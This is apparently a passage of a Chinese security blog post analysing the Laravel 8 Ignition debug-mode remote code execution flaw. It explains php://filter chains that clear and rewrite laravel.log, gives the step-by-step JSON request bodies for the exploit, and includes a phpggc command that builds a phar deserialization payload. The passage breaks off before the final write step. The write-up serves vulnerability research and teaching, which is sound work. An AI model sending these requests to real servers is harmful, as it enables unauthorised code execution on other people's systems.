class="string">&quot;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>最终发现base64过滤器各种直接用不上，但问题不大，<strong>这里记得他的一个特性，如果不存在 <code>=</code> 号，他可以帮助我们去掉非base64编码后的字符。</strong></p><h3 id="3-4-考虑其他-filter-过滤器"><a href="#3-4-考虑其他-filter-过滤器" class="headerlink" title="3.4 考虑其他 filter 过滤器"></a>3.4 考虑其他 filter 过滤器</h3><p>清空文件除了使用 base64-decode过滤器，也可以使用，而且不会受到特殊符号的影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=consumed/resource=../storage/logs/laravel.log</span></span><br></pre></td></tr></table></figure><p>Emm，不过就是不知道这个 <code>filter</code> 是如何发现的。。网上找了半天没找到</p><p>至此，上面的问题还是没有解决</p><p>问题在于，如何在存在<code>[prefix]</code> <code>[midfix1]</code> <code>[midfix2]</code> <code>[suffix]</code> 的情况下，如何让可控<code>PAYLOAD</code>被利用？</p><p>来硬的不行，换个思路，假设可以让<code>[prefix]</code> <code>[midfix1]</code> <code>[midfix2]</code> <code>[suffix]</code>转换为不可见字符，保留 <code>PAYLOAD</code> 部分为可见字符，然后结合PHP base64 解码的特性，是不是就可以只保留 <code>PAYLOAD</code> 部分了？</p><p>好像还真可以，利用<code>filter过滤器</code>把日志内容识别为 <code>UTF-16</code> 编码，并转换为 <code>UTF-8</code>编码，因为 <code>UTF-16</code> 是双字节编码，那么原有的 <code>[prefix]</code> 是否就全变为不可见字符？</p><p>参考官方例子 <a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv">PHP: Conversion Filters - Manual</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">stream_filter_append(<span class="variable">$fp</span>, <span class="string">&#x27;convert.iconv.utf-16le.utf-8&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="string">&quot;T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">/* Outputs: This is a test. */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后 <code>PAYLOAD</code> 部分，输入  <code>P\0A\0Y\0L\0O\0A\0D\0</code> ，写入时指定 utf16le -&gt; utf-8</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.iconv.utf-16le.utf-8/resource=../storage/logs/laravel.log</span></span><br></pre></td></tr></table></figure><p>转换为 UTF-8 刚刚好为 <code>PAYLAOD</code>，最后在 base64解码一下，刚刚好只剩下 <code>PAYLOAD</code> 部分。赶紧试试，太骚了这思路。</p><p><img src="/img/laravel8-debug-rce/image-20210606092741651.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606092741651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606092741651"></p><p>发现写不进去。。仔细想想，<code>\0</code> 在PHP是阶段，会报错，也难怪，而且到时候 file_get_contets() 的时候，也会报错。</p><p>这里又需利用到另外一个过滤器</p><p><a href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable">https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable</a></p><p>我们可以先把 <code>\0</code> 编码为 <code>=00</code>，读取的时候解码即可。</p><p>先写入PAYLOAD，这里为 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t=00a=00r=00i=00</span><br></pre></td></tr></table></figure><p><img src="/img/laravel8-debug-rce/image-20210606101905575.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606101905575.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606101905575"></p><p>然后写入，先解码 <code>=00</code> 然后在把<code>utf16</code>转换为<code>utf8</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8/resource=../storage/logs/laravel.log</span></span><br></pre></td></tr></table></figure><p><img src="/img/laravel8-debug-rce/image-20210606104747901.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606104747901.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606104747901"></p><p>又报错了，utf16要求双字节对齐，但日志文件来说，不一定是双字节对齐。处理方法很简单，任何数*2都是偶数，就双字节对齐啦，如变成下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix]</span><br><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix]</span><br></pre></td></tr></table></figure><p>赶紧尝试一下 （</p><p>不出意外，又报错了</p><p><img src="/img/laravel8-debug-rce/image-20210607112439248.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607112439248.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607112439248"></p><p>找了半天，原来<code>PAYLOAD</code>被部分截断了，然后截断的位置非常神奇，并且加了个点 <code>=0.</code>，导致解码错误，</p><p><img src="/img/laravel8-debug-rce/image-20210607110143247.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607110143247.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607110143247"></p><p>写个小demo，果然如此</p><p><img src="/img/laravel8-debug-rce/image-20210607112920709.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607112920709.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607112920709"></p><p>即我们的<code>部分PAYLOAD</code>导致出了问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix]</span><br></pre></td></tr></table></figure><p>这个容易解决，查看日志文件，数一下发现只会截断前15个，我们这里填充个100个随意字符，这里选择填充<code>A</code>，怎么也不会殃及到我们的<code>PAYLOAD</code></p><p>也就是说，我们现在不用关心<code>部分PAYLOAD</code>了，现变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix]</span><br></pre></td></tr></table></figure><p>先清空日志，然后发两次</p><p><img src="/img/laravel8-debug-rce/image-20210607140820694.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607140820694.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607140820694"></p><p>转换</p><p><img src="/img/laravel8-debug-rce/image-20210607140842883.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607140842883.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607140842883"></p><p><img src="/img/laravel8-debug-rce/image-20210607140919471.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210607140919471.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210607140919471"></p><p>nice~</p><p>特殊字符用base64编码去特殊字符就行，当然我们的 <code>tari</code> 没有进行base64编码，所以直接base64解码，特殊字符是去掉了，不过我们的 <code>tari</code> 也会被解码为乱码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tari&quot;</span> | base64 | sed -E <span class="string">&#x27;s/./&amp;\=00/g&#x27;</span> </span><br><span class="line"><span class="comment"># 输出 d=00G=00F=00y=00a=00Q=00o=00==00</span></span><br></pre></td></tr></table></figure><p>看到了熟悉的有问题的子串 <code>==00</code> 号，就和我们日志里出现的 <code>=0.</code> 类似，都会有问题</p><p>这里有两个方法</p><ol><li>编码 <code>=</code>，即编码为 <code>=3D</code></li><li>base64编码后，把<code>=</code>号去掉，因为PHP的base64解码发现位数不为4的整数倍，会自动在后方加 <code>=</code> 号，这点在3.3小节说过</li></ol><p>这里选择第2种方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tari&quot;</span> | base64 | sed -E <span class="string">&#x27;s/=+$//g&#x27;</span> | sed -E <span class="string">&#x27;s/./&amp;\=00/g&#x27;</span></span><br><span class="line"><span class="comment"># 输出 d=00G=00F=00y=00a=00Q=00o=00</span></span><br></pre></td></tr></table></figure><h3 id="3-5-两个PAYLOAD和双字节对齐"><a href="#3-5-两个PAYLOAD和双字节对齐" class="headerlink" title="3.5 两个PAYLOAD和双字节对齐"></a>3.5 两个PAYLOAD和双字节对齐</h3><p>但是这样还有个问题，就是我们的 <code>PAYLOAD</code> 出现了两次，处理方法很简单，把原来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix]</span><br></pre></td></tr></table></figure><p>转换为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix]</span><br></pre></td></tr></table></figure><p>其中 <code>PAYLOAD_1</code>随意即可，无需为真的<code>PAYLOAD</code>，比如我们可以把 <code>PAYLOAD_1</code> 变为保持为100个 <code>&#39;A&#39;</code> ，因为没有 <code>\0</code> ，所以从<code>utf16</code>转换为<code>utf-8</code>会把他转换为”乱码”</p><p>到这里可能会有所疑问，我们的 <code>PAYLOAD_2</code> 不是也出现了两次么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix]</span><br></pre></td></tr></table></figure><p>这里也挺巧妙的，一开始我们是清空了日志的，这时我们的日志文件 <code>laravel.log</code> 文件为空。</p><p> <code>PAYLOAD_1</code> 和 <code>PAYLOAD_2</code> 前面都填充了 100个 <code>A</code>，所以 <code>[midfix1][midfix2][suffix]</code>部分是一样的，而且是不会变的。</p><p><img src="/img/laravel8-debug-rce/image-20210608094733672.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608094733672.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608094733672"></p><p><img src="/img/laravel8-debug-rce/image-20210608094656287.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608094656287.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608094656287"></p><p>首先看看整体是不是双字节对齐的</p><p><strong>==证明1：==</strong></p><ul><li><p><code>PAYLOAD_1</code> 是偶数，已对齐；</p></li><li><p>2个<code>[prefix][midfix1][midfix2][suffix]</code> 是一样的，无论奇偶与否，乘以2都是偶数，对齐；</p></li><li><p><code>PAYLOAD_2</code>也是有两个，对齐；</p></li></ul><p>所以整体肯定是对齐的。不然过滤器 <code>convert.iconv.utf-16le.utf-8</code> 无法正常工作。</p><p><strong>==证明1证毕==</strong></p><p>接下来考虑顺序问题，会不会因 <code>奇数+P\0A\0</code> 刚好把我们精心构造的<code>PAYLOAD</code>给破坏了呢？</p><p>我们发的第一个填充包，整体可能是奇数，也可能是偶数，，接下来分两种情况分别讨论</p><ul><li><strong>前提</strong></li></ul><p><code>[prefix]</code> 长度为 53，为奇数，这里应该都是一样的，尝试过使用内网其他机器访问，也是 local.ERROR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2021-06-07 07:52:32] local.ERROR: file_get_contents(</span><br></pre></td></tr></table></figure><p><code>midfix1</code> 长度为 119，为奇数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">): failed to open stream: No such file or directory &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(</span><br></pre></td></tr></table></figure><p>设定 S<sub>i</sub> 表示串下标为 i 之前的子串</p><ul><li><strong>当第1个填充包为奇数</strong></li></ul><p>由<strong>证明1</strong>知，我们发的2个包肯定是双字节对齐，也就是偶数，那么此时第2个填充包肯定也为奇数</p><p>S<sub>i</sub> = 第1个填充包（奇数） + 第二个包的<code>[prefix]</code>部分（奇数） -&gt; 偶数</p><p>此时没有破坏 <code>第1个PAYLOAD_2</code></p><p>然后 <code>[midfix2]</code>的长度 S<sub>i+1</sub>是奇数，此时 S<sub>i+1</sub> + <code>P\0A\0</code> 肯定会破坏<code>第2个PAYLOAD_2</code>，也就是说这部分经转换为乱码</p><p>因为此前都是偶数，<code>[midfix2]</code> 到最后肯定也是偶数，不会破坏双字节对齐</p><p>最终输出的为，<code>base64_decode(乱码+第1个PAYLOAD_2+乱码)</code>，就仅有 <code>PAYLOAD_2</code></p><p>因此这种情况最终只有1个我们构造的<code>PAYLOAD</code>，符合条件</p><ul><li><strong>当第一个填充包为偶数</strong></li></ul><p>由<strong>证明1</strong>知，我们发的2个包肯定是双字节对齐，也就是偶数，那么此时第2个填充包肯定也为偶数</p><p>S<sub>i+2</sub> = 第1个填充包（偶数） + 第二个包的<code>[prefix]</code>部分（奇数） -&gt; 奇数，</p><p> S<sub>i+2</sub> （奇数） + <code>P\0A\0</code> 肯定会破坏<code>第1个PAYLOAD_2</code>，这部分都为乱码，不用理会</p><p>此时 S<sub>i+3</sub>  =  S<sub>i+2</sub> （奇数） +  <code>第1个PAYLOAD_2</code>（偶数） -&gt; 奇数</p><p>然后S<sub>i+4</sub> = S<sub>i+3</sub>（奇数） + <code>[midfix2]</code> （奇数） -&gt; 偶数</p><p>S<sub>i+4</sub>（偶数）并不会破坏 <code>第二个PAYLOAD_2</code> 的结构，</p><p>S<sub>i+4</sub>（偶数）+ <code>第二个PAYLOAD_2</code> (偶数) -&gt; 偶数，所以后面也为偶数，不会破坏双字节对齐</p><p>最终输出的为，<code>base64_decode(乱码+第2个PAYLOAD_2+乱码)</code>，就仅有 <code>PAYLOAD_2</code></p><p>因此这种情况最终只有1个我们构造的<code>PAYLOAD</code>，符合条件</p><ul><li><strong>综上</strong></li></ul><p>下面这种构造方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix]</span><br></pre></td></tr></table></figure><p><code>[prefix]</code> 和 <code>[midfix1]</code> 都为奇数， 且 <code>PAYLOAD_1</code> 为长度偶数，最终可以安全的得到一个 <code>PAYLOAD_2</code></p><ul><li><strong>另外一种情形</strong></li></ul><p>因为包的 <code>[prefix]</code> 和 <code>[midfix1]</code>  部分刚好都为奇数，所以是这样。</p><p>如果是其他情况呢，假设 <code>[prefix]</code> 和 <code>[midfix1]</code>  是前奇后偶的情况？</p><p>这个和实际利用情况很像，因为如果file_get_contents 输入的参数过长，<code>[midfix1]</code> 会变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">): failed to open stream: Invalid argument &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents(</span><br></pre></td></tr></table></figure><p>长度是 110</p><p>就需要在我们想要的PAYLOAD最后填充 <code>=00</code>，就可以了，因为这样无论第1个或第2个PAYLOAD前面是奇数还是偶数，首先双字节一定是对齐的，然后第1个PAYLOAD前是奇数，会吃掉第1个PAYLOAD，又因PAYLOAD后有一个<code>=00</code> 会吃掉后面一个字符，这样就变成了偶数，所以第二个不会被吃，反则反之。</p><p>所以前奇后偶的情况是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix]</span><br><span class="line">[prefix]PAYLOAD_2=00[midfix1]PAYLOAD_2=00[midfix2][suffix]</span><br></pre></td></tr></table></figure><p>因为第1个payload前只有奇数或偶数两种情况，所以考虑这两种情况足以。</p><p>那么针对这两种情况，有没有通用的解决方法呢？（我暂没发现。。</p><h3 id="3-6-整合"><a href="#3-6-整合" class="headerlink" title="3.6 整合"></a>3.6 整合</h3><ol><li>清空日志</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/read=consumed/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/laravel8-debug-rce/image-20210608092843302.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608092843302.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608092843302"></p><ol start="2"><li>写入填充数据</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/laravel8-debug-rce/image-20210608092629402.png?lastModify=1623115607" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608092629402.png?lastModify=1623115607" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608092629402"></p><ol start="3"><li>写入我们可控数据</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd=00G=00F=00y=00a=00Q=00o=00&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里Payload字段比较短，为双奇数型，不需要处理</p><p><img src="/img/laravel8-debug-rce/image-20210609000509235.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210609000509235.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210609000509235"></p><p>如果比较长，比如真实漏洞利用，一般为前奇后偶型，需要在<code>PAYLOAD</code>后缀加上 <code>=00</code> 保证对齐</p><ol start="4"><li>转换去除无关数据</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/laravel8-debug-rce/image-20210608092322607.png?lastModify=1623115607" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608092322607.png?lastModify=1623115607" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608092322607"></p><p>OK，终于可控了~</p><p><img src="/img/laravel8-debug-rce/image-20210608092359658.png?lastModify=1623115607" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210608092359658.png?lastModify=1623115607" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210608092359658"></p><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><h3 id="4-1-手工利用"><a href="#4-1-手工利用" class="headerlink" title="4.1 手工利用"></a>4.1 手工利用</h3><p>4.1.1 清空日志</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/read=consumed/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>4.1.2 写入填充对齐数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>4.1.3 生成并写入 phar payload</p><p>4.1.3.1 生成phar payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d <span class="string">&#x27;phar.readonly=0&#x27;</span> ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o php://output | base64 -b0 | sed -E <span class="string">&#x27;s/=+$//g&#x27;</span> | sed -E <span class="string">&#x27;s/./&amp;=00/g&#x27;</span></span><br></pre></td></tr></table></figure><p>4.1.3.2 写入phar payload 数据 (4.1.3.1 生成的)</p><figure class="highlight 